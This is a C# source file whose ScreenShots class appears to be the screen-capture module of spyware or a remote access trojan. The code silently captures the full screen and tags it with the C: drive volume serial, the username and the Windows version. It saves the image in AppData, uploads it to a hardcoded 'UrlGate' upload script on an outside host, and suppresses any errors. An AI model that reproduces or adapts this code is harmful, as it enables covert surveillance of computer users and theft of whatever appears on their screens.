using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.CompilerServices;
using System.Reflection;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Drawing.Imaging;
using System.Collections.Specialized;
using System.Drawing;
using System.Windows.Forms;


namespace adminka
{
    class ScreenShots
    {
        public string AppDataDir;

        [DllImport("Kernel32.dll", SetLastError = true)]
        extern static bool GetVolumeInformation(string vol, StringBuilder name, int nameSize, out uint serialNum, out uint maxNameLen, out uint flags, StringBuilder fileSysName, int fileSysNameSize);
        
        public ScreenShots()
        {
            AppDataDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }

        public static Bitmap CaptureScreen256()
        {
            Rectangle bounds = SystemInformation.VirtualScreen;
            using (Bitmap Temp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb))
            {
                using (Graphics g = Graphics.FromImage(Temp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Temp.Size);
                }
                return Temp.Clone(new Rectangle(0, 0, bounds.Width, bounds.Height), PixelFormat.Format8bppIndexed);
            }
        }

        public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
        {
            Console.WriteLine(string.Format("Uploading {0} to {1}", file, url));
            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");

            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
            wr.ContentType = "multipart/form-data; boundary=" + boundary;
            wr.Method = "POST";
            wr.KeepAlive = true;
            wr.Credentials = System.Net.CredentialCache.DefaultCredentials;

            Stream rs = wr.GetRequestStream();

            string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
            foreach (string key in nvc.Keys)
            {
                rs.Write(boundarybytes, 0, boundarybytes.Length);
                string formitem = string.Format(formdataTemplate, key, nvc[key]);
                byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
                rs.Write(formitembytes, 0, formitembytes.Length);
            }
            rs.Write(boundarybytes, 0, boundarybytes.Length);

            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
            string header = string.Format(headerTemplate, paramName, file, contentType);
            byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
            rs.Write(headerbytes, 0, headerbytes.Length);

            FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[4096];
            int bytesRead = 0;
            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                rs.Write(buffer, 0, bytesRead);
            }
            fileStream.Close();

            byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
            rs.Write(trailer, 0, trailer.Length);
            rs.Close();

            WebResponse wresp = null;
            try
            {
                wresp = wr.GetResponse();
                Stream stream2 = wresp.GetResponseStream();
                StreamReader reader2 = new StreamReader(stream2);
                Console.WriteLine(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error uploading file", ex);
                if (wresp != null)
                {
                    wresp.Close();
                    wresp = null;
                }
            }
            finally
            {
                wr = null;
            }
        }

        public static uint GetVolumeSerial(string strDriveLetter)
        {
            uint serialNum, maxNameLen, flags;
            bool ok = GetVolumeInformation(strDriveLetter, null, 0, out serialNum, out maxNameLen, out flags, null, 0);
            return serialNum;
        }

        public void SendScreen(string username, string ver)
        {
            var bmp = CaptureScreen256();
            int tick = System.Environment.TickCount;
            String fn1 = AppDataDir + "\\scr" + tick.ToString() + ".png";
            bmp.Save(fn1, ImageFormat.Png);

            NameValueCollection nvc = new NameValueCollection();
            uint id = GetVolumeSerial("C:\\");
            nvc.Add("id", id.ToString() + "-" + username);
            nvc.Add("ver", ver);

            System.OperatingSystem osInfo = System.Environment.OSVersion;
            string winver = osInfo.Version.Major.ToString() + "." + osInfo.Version.Minor.ToString();

            nvc.Add("winver", winver);

            string UrlGate = "http://lara-test.ru/upl/upload.php";

            try
            {
                HttpUploadFile(UrlGate, @fn1, "filename", "image/jpeg", nvc);
            }
            catch
            {

            }
        }

    }
}
